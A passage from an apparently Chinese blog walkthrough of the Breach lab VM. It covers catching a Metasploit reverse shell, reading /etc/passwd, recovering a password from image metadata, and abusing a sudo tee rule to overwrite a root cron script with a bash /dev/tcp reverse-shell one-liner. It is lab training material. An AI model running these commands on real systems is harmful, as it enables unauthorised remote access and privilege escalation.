class="built_in">set</span> payload java/meterpreter/bind_tcp       <span class="built_in">set</span> payload java/shell/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> payload java/meterpreter/reverse_http   <span class="built_in">set</span> payload java/shell_reverse_tcp</span><br><span class="line"><span class="built_in">set</span> payload java/meterpreter/reverse_https</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload java/jsp_shell_reverse_tcp</span><br><span class="line">payload =&gt; java/jsp_shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (java/jsp_shell_reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line">   SHELL                   no        The system shell to use.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.110.1</span><br><span class="line">lhost =&gt; 192.168.110.1</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.110.1:4444</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[*] Command shell session 1 opened (192.168.110.1:4444 -&gt; 192.168.110.140:49888) at 2021-05-03 16:50:26 +0800</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">common</span><br><span class="line">conf</span><br><span class="line">logs</span><br><span class="line">server</span><br><span class="line">shared</span><br><span class="line">webapps</span><br><span class="line">work</span><br></pre></td></tr></table></figure>
<p>成功回弹<br>以后就用这个了，不用麻烦再去webshell里面去创建回弹</p>
<h2 id="主机信息搜集"><a href="#主机信息搜集" class="headerlink" title="主机信息搜集"></a>主机信息搜集</h2><h3 id="老样子上传linpeas"><a href="#老样子上传linpeas" class="headerlink" title="老样子上传linpeas"></a>老样子上传linpeas</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cannot write to ‘linpeas.sh’ (Permission denied).</span><br></pre></td></tr></table></figure>
<p>提示无权限</p>
<h3 id="手工搜集"><a href="#手工搜集" class="headerlink" title="手工搜集"></a>手工搜集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:</span><br><span class="line">syslog:x:101:104::/home/syslog:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:102:106::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">landscape:x:103:109::/var/lib/landscape:/bin/<span class="literal">false</span></span><br><span class="line">milton:x:1000:1000:Milton_Waddams,,,:/home/milton:/bin/bash</span><br><span class="line">tomcat6:x:104:112::/usr/share/tomcat6:/bin/<span class="literal">false</span></span><br><span class="line">colord:x:105:114:colord colour management daemon,,,:/var/lib/colord:/bin/<span class="literal">false</span></span><br><span class="line">mysql:x:106:116:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">blumbergh:x:1001:1001:Bill Lumbergh,,,:/home/blumbergh:/bin/bash</span><br></pre></td></tr></table></figure>
<p>可以发现有二个用户可以供我们选择</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">blumbergh:x:1001:1001:Bill Lumbergh,,,:/home/blumbergh:/bin/bash</span><br><span class="line">milton:x:1000:1000:Milton_Waddams,,,:/home/milton:/bin/bash</span><br></pre></td></tr></table></figure>
<p>现在我们所需要的就是找出这两个用户的密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">tomcat6@Breach:/var/www/html/images$ ls</span><br><span class="line">ls</span><br><span class="line">bill.png  cake.jpg  initech.jpg  milton_beach.jpg  swingline.jpg  troll.gif</span><br><span class="line">````</span><br><span class="line">在网站根目录的images文件夹下，我们发现一个名为milton_beach.jpg的图像文件</span><br><span class="line">![](https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504010502.png)</span><br><span class="line">就是他</span><br><span class="line">打印一下</span><br><span class="line">没有任何有效字符</span><br><span class="line">又有个名为bill的图片，与blumbergh对应</span><br><span class="line">![](https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004520.png)</span><br><span class="line">之前没有看到过，并且给出了提示</span><br><span class="line">打印一下</span><br><span class="line">```bash</span><br><span class="line">...</span><br><span class="line">[skip]</span><br><span class="line">...</span><br><span class="line">3Mqs</span><br><span class="line">c&#123;<span class="string">&#x27;t</span></span><br><span class="line"><span class="string">tEXtComment</span></span><br><span class="line"><span class="string">coffeestains</span></span><br><span class="line"><span class="string">IEND</span></span><br></pre></td></tr></table></figure>
<p>发现字符串</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">tEXtComment</span><br><span class="line">coffeestains</span><br><span class="line">IEND</span><br><span class="line">````</span><br><span class="line"><span class="comment">## 提权</span></span><br><span class="line"><span class="comment">### bluebergh</span></span><br><span class="line">```bash</span><br><span class="line">tEXtComment</span><br><span class="line">coffeestains</span><br><span class="line">IEND</span><br><span class="line">````</span><br><span class="line">可能是密码，打算提下权</span><br><span class="line">```bash</span><br><span class="line">su blumbergh</span><br><span class="line">su blumbergh</span><br><span class="line">Password: tEXtComment</span><br><span class="line"></span><br><span class="line">su: Authentication failure</span><br><span class="line">tomcat6@Breach:/var/lib/tomcat6$ su blumbergh</span><br><span class="line">su blumbergh</span><br><span class="line">Password: coffeestains</span><br><span class="line"></span><br><span class="line">blumbergh@Breach:/var/lib/tomcat6$</span><br></pre></td></tr></table></figure>
<p>经过测试知道</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blumbergh:coffeestains</span><br></pre></td></tr></table></figure>
<p>我们现在在blumbergh用户上</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.110.1:9000/linpeas.sh</span><br><span class="line">wget http://192.168.110.1:9000/linpeas.sh</span><br><span class="line">--2021-05-03 02:26:58--  http://192.168.110.1:9000/linpeas.sh</span><br><span class="line">Connecting to 192.168.110.1:9000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 330173 (322K) [application/x-sh]</span><br><span class="line">linpeas.sh: Permission denied</span><br><span class="line"></span><br><span class="line">Cannot write to ‘linpeas.sh’ (Permission denied).</span><br></pre></td></tr></table></figure>
<p>还是没有权限下载我的linpeas,真的很讨厌手工！！！！！！</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">blumbergh@Breach:/var/lib/tomcat6$ <span class="built_in">cd</span></span><br><span class="line"><span class="built_in">cd</span></span><br><span class="line">blumbergh@Breach:~$ ls</span><br><span class="line">ls</span><br><span class="line">blumbergh@Breach:~$ ls</span><br><span class="line">ls</span><br><span class="line">blumbergh@Breach:~$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 3 blumbergh blumbergh 4096 Jun 12  2016 .</span><br><span class="line">drwxr-xr-x 4 root      root      4096 Jun  4  2016 ..</span><br><span class="line">-rw------- 1 blumbergh blumbergh   61 Jun 12  2016 .bash_history</span><br><span class="line">-rw-r--r-- 1 blumbergh blumbergh  220 Jun  4  2016 .bash_logout</span><br><span class="line">-rw-r--r-- 1 blumbergh blumbergh 3637 Jun  4  2016 .bashrc</span><br><span class="line">drwx------ 2 blumbergh blumbergh 4096 Jun  6  2016 .cache</span><br><span class="line">-rw-r--r-- 1 blumbergh blumbergh  675 Jun  4  2016 .profile</span><br><span class="line">blumbergh@Breach:~$ cat bash_history</span><br><span class="line">cat bash_history</span><br><span class="line">cat: bash_history: No such file or directory</span><br><span class="line">blumbergh@Breach:~$ cat .bash_history</span><br><span class="line">cat .bash_history</span><br><span class="line">clear</span><br><span class="line">logoff</span><br><span class="line"><span class="built_in">logout</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="built_in">cd</span> /usr/share/cleanup</span><br><span class="line">cat tidyup.sh</span><br><span class="line">blumbergh@Breach:~$</span><br></pre></td></tr></table></figure>
<p>在根路径下有隐藏文件bash_history,读取后发现文件tidyup.sh</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/share/cleanup</span><br><span class="line"><span class="built_in">cd</span> /usr/share/cleanup</span><br><span class="line">blumbergh@Breach:/usr/share/cleanup$ ls</span><br><span class="line">ls</span><br><span class="line">tidyup.sh</span><br><span class="line">blumbergh@Breach:/usr/share/cleanup$ cat tidyup.sh</span><br><span class="line">cat tidyup.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Hacker Evasion Script</span></span><br><span class="line"><span class="comment">#Initech Cyber Consulting, LLC</span></span><br><span class="line"><span class="comment">#Peter Gibbons and Michael Bolton - 2016</span></span><br><span class="line"><span class="comment">#This script is set to run every 3 minutes as an additional defense measure against hackers.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /var/lib/tomcat6/webapps &amp;&amp; find swingline -mindepth 1 -maxdepth 10 | xargs rm -rf</span><br><span class="line">blumbergh@Breach:/usr/share/cleanup$</span><br></pre></td></tr></table></figure>
<h3 id="ROOT"><a href="#ROOT" class="headerlink" title="ROOT"></a>ROOT</h3><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004521.png"><br>看来我们之前之所以上传都是失败的，是因为这个脚本的原因，我们所有的上传文件都会在这个<code>swingline</code>文件夹里，然后其三分钟执行一次</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ls -la tidyup.sh</span><br><span class="line">ls -la tidyup.sh</span><br><span class="line">-rwxr-xr-x 1 root root 289 Jun 12  2016 tidyup.sh</span><br><span class="line">blumbergh@Breach:/usr/share/cleanup$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> blumbergh on Breach:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User blumbergh may run the following commands on Breach:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh</span><br></pre></td></tr></table></figure>
<p>验证了我们对于<code>tidyup.sh</code>具有读写权限，这就好办了，直接写个回弹shell<br>别用vim……………..</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">^[[B^[[D^[[A^[[B^[[C^[[C^[[B^[[B^[^[^[^[^[^[^[^[^[^[:q</span><br><span class="line"></span><br><span class="line"><span class="comment">#Hacker Evasion Script</span></span><br><span class="line"><span class="comment">#Initech Cyber Consulting, LLC</span></span><br><span class="line"><span class="comment">#Peter Gibbons and Michael Bolton - 2016</span></span><br><span class="line"><span class="comment">#This script is set to run every 3 minutes as an additional defense measure agai</span></span><br><span class="line">nst hackers.</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /var/lib/tomcat6/webapps &amp;&amp; find swingline -mindepth 1 -maxdepth 10 | xargs r</span><br><span class="line">m -rf</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">~</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.110.1/9001 0&gt;&amp;1&quot;</span> &gt; tidyup.sh</span><br><span class="line">1 0&gt;&amp;1<span class="string">&quot; &gt; tidyup.shev/tcp/192.168.110.1/900</span></span><br><span class="line"><span class="string">bash: tidyup.sh: Permission denied</span></span><br></pre></td></tr></table></figure>
<p>看来只能用他允许的tee<br><a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-tee.html">Linux tee命令 | 菜鸟教程 (runoob.com)</a><br>简单</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#首先你要cd到到你的根路径下下个shell</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.110.1/9001 0&gt;&amp;1&quot;</span> &gt; shell.txt</span><br><span class="line"><span class="comment">#然后</span></span><br><span class="line">cat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</span><br><span class="line">sht shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.110.1/9001 0&gt;&amp;1</span><br><span class="line">blumbergh@Breach:~$ cat shell.txt | sudo /usr/bin/tee -a /usr/share/cleanup/tidyup.sh</span><br><span class="line">up.shhell.txt | sudo /usr/bin/tee -a /usr/share/cleanup/tidy</span><br><span class="line">[sudo] password <span class="keyword">for</span> blumbergh:</span><br><span class="line"><span class="comment">#这里遇到了一个坑就是，我加上了参数他就要密码，只能覆盖</span></span><br></pre></td></tr></table></figure>
<p>等了三分钟不弹会话<br>查看下bin</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">blumbergh@Breach:/bin$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 9920</span><br><span class="line">drwxr-xr-x  2 root root    4096 Jun  5  2016 .</span><br><span class="line">drwxr-xr-x 22 root root    4096 Jun  4  2016 ..</span><br><span class="line">-rwxr-xr-x  1 root root 1021112 Oct  7  2014 bash</span><br><span class="line">-rwxr-xr-x  3 root root   31152 Oct 21  2013 bunzip2</span><br><span class="line">-rwxr-xr-x  1 root root 1918032 Nov 14  2013 busybox</span><br><span class="line">-rwxr-xr-x  3 root root   31152 Oct 21  2013 bzcat</span><br><span class="line">lrwxrwxrwx  1 root root       6 May 20  2016 bzcmp -&gt; bzdiff</span><br><span class="line">-rwxr-xr-x  1 root root    2140 Oct 21  2013 bzdiff</span><br><span class="line">lrwxrwxrwx  1 root root       6 May 20  2016 bzegrep -&gt; bzgrep</span><br><span class="line">-rwxr-xr-x  1 root root    4877 Oct 21  2013 bzexe</span><br><span class="line">lrwxrwxrwx  1 root root       6 May 20  2016 bzfgrep -&gt; bzgrep</span><br><span class="line">-rwxr-xr-x  1 root root    3642 Oct 21  2013 bzgrep</span><br><span class="line">-rwxr-xr-x  3 root root   31152 Oct 21  2013 bzip2</span><br><span class="line">-rwxr-xr-x  1 root root   14480 Oct 21  2013 bzip2recover</span><br><span class="line">lrwxrwxrwx  1 root root       6 May 20  2016 bzless -&gt; bzmore</span><br><span class="line">-rwxr-xr-x  1 root root    1297 Oct 21  2013 bzmore</span><br><span class="line">-rwxr-xr-x  1 root root   47904 Mar 10  2016 cat</span><br><span class="line">-rwxr-xr-x  1 root root   14688 May 23  2013 chacl</span><br><span class="line">-rwxr-xr-x  1 root root   60160 Mar 10  2016 chgrp</span><br><span class="line">-rwxr-xr-x  1 root root   56032 Mar 10  2016 chmod</span><br><span class="line">-rwxr-xr-x  1 root root   60160 Mar 10  2016 chown</span><br><span class="line">-rwxr-xr-x  1 root root   10480 Feb 18  2013 chvt</span><br><span class="line">-rwxr-xr-x  1 root root  130304 Mar 10  2016 cp</span><br><span class="line">-rwxr-xr-x  1 root root  137304 Feb 18  2016 cpio</span><br><span class="line">-rwxr-xr-x  1 root root  121272 Feb 19  2014 dash</span><br><span class="line">-rwxr-xr-x  1 root root   60160 Mar 10  2016 date</span><br><span class="line">-rwxr-xr-x  1 root root   10536 Nov 25  2014 dbus-cleanup-sockets</span><br><span class="line">-rwxr-xr-x  1 root root  434032 Nov 25  2014 dbus-daemon</span><br><span class="line">-rwxr-xr-x  1 root root   10464 Nov 25  2014 dbus-uuidgen</span><br><span class="line">-rwxr-xr-x  1 root root   56136 Mar 10  2016 dd</span><br><span class="line">-rwxr-xr-x  1 root root   97768 Mar 10  2016 df</span><br><span class="line">-rwxr-xr-x  1 root root  110080 Mar 10  2016 dir</span><br><span class="line">-rwxr-xr-x  1 root root   22896 Sep  2  2015 dmesg</span><br><span class="line">lrwxrwxrwx  1 root root       8 May 20  2016 dnsdomainname -&gt; hostname</span><br><span class="line">lrwxrwxrwx  1 root root       8 May 20  2016 domainname -&gt; hostname</span><br><span class="line">-rwxr-xr-x  1 root root   82256 Feb 18  2013 dumpkeys</span><br><span class="line">-rwxr-xr-x  1 root root   31296 Mar 10  2016 <span class="built_in">echo</span></span><br><span class="line">-rwxr-xr-x  1 root root   47712 Jul 16  2013 ed</span><br><span class="line">-rwxr-xr-x  1 root root  183696 Jan 18  2014 egrep</span><br><span class="line">-rwxr-xr-x  1 root root   27168 Mar 10  2016 <span class="literal">false</span></span><br><span class="line">-rwxr-xr-x  1 root root   10488 Feb 18  2013 fgconsole</span><br><span class="line">-rwxr-xr-x  1 root root  138352 Jan 18  2014 fgrep</span><br><span class="line">-rwxr-xr-x  1 root root   36144 Sep  2  2015 findmnt</span><br><span class="line">-rwxr-xr-x  1 root root   31864 Nov 29  2012 fuser</span><br><span class="line">-rwsr-xr-x  1 root root   30800 May 15  2015 fusermount</span><br><span class="line">-rwxr-xr-x  1 root root   23688 May 23  2013 getfacl</span><br><span class="line">-rwxr-xr-x  1 root root  191952 Jan 18  2014 grep</span><br><span class="line">-rwxr-xr-x  2 root root    2303 Jan 10  2014 gunzip</span><br><span class="line">-rwxr-xr-x  1 root root    5937 Jan 10  2014 gzexe</span><br><span class="line">-rwxr-xr-x  1 root root   94048 Jan 10  2014 gzip</span><br><span class="line">-rwxr-xr-x  1 root root   14736 Dec 13  2013 hostname</span><br><span class="line">-rwxr-xr-x  1 root root  307328 Jul 23  2015 ip</span><br><span class="line">-rwxr-xr-x  1 root root   10480 Feb 18  2013 kbd_mode</span><br><span class="line">-rwxr-xr-x  1 root root   23088 Feb 10  2015 <span class="built_in">kill</span></span><br><span class="line">-rwxr-xr-x  1 root root  154616 Apr 10  2014 kmod</span><br><span class="line">-rwxr-xr-x  1 root root  153664 Jun 10  2013 less</span><br><span class="line">-rwxr-xr-x  1 root root   10440 Jun 10  2013 lessecho</span><br><span class="line">lrwxrwxrwx  1 root root       8 May 20  2016 lessfile -&gt; lesspipe</span><br><span class="line">-rwxr-xr-x  1 root root   15912 Jun 10  2013 lesskey</span><br><span class="line">-rwxr-xr-x  1 root root    7758 Jun 10  2013 lesspipe</span><br><span class="line">-rwxr-xr-x  1 root root   56072 Mar 10  2016 ln</span><br><span class="line">-rwxr-xr-x  1 root root  111432 Feb 18  2013 loadkeys</span><br><span class="line">-rwxr-xr-x  1 root root   49168 Jan 26  2016 login</span><br><span class="line">-rwxr-xr-x  1 root root   92328 Feb 25  2016 loginctl</span><br><span class="line">-rwxr-xr-x  1 root root   63912 Dec 18  2013 lowntfs-3g</span><br><span class="line">-rwxr-xr-x  1 root root  110080 Mar 10  2016 ls</span><br><span class="line">-rwxr-xr-x  1 root root   44688 Sep  2  2015 lsblk</span><br><span class="line">lrwxrwxrwx  1 root root       4 May 20  2016 lsmod -&gt; kmod</span><br><span class="line">-rwxr-xr-x  1 root root   51936 Mar 10  2016 mkdir</span><br><span class="line">-rwxr-xr-x  1 root root   35456 Mar 10  2016 mknod</span><br><span class="line">-rwxr-xr-x  1 root root   39648 Mar 10  2016 mktemp</span><br><span class="line">-rwxr-xr-x  1 root root   39600 Sep  2  2015 more</span><br><span class="line">-rwsr-xr-x  1 root root   94792 Sep  2  2015 mount</span><br><span class="line">-rwxr-xr-x  1 root root   10456 Feb 16  2016 mountpoint</span><br><span class="line">lrwxrwxrwx  1 root root      20 May 20  2016 mt -&gt; /etc/alternatives/mt</span><br><span class="line">-rwxr-xr-x  1 root root   68760 Feb 18  2016 mt-gnu</span><br><span class="line">-rwxr-xr-x  1 root root  122088 Mar 10  2016 mv</span><br><span class="line">-rwxr-xr-x  1 root root  192008 Oct  1  2012 nano</span><br><span class="line">lrwxrwxrwx  1 root root      20 May 20  2016 nc -&gt; /etc/alternatives/nc</span><br><span class="line">-rwxr-xr-x  1 root root   31248 Dec  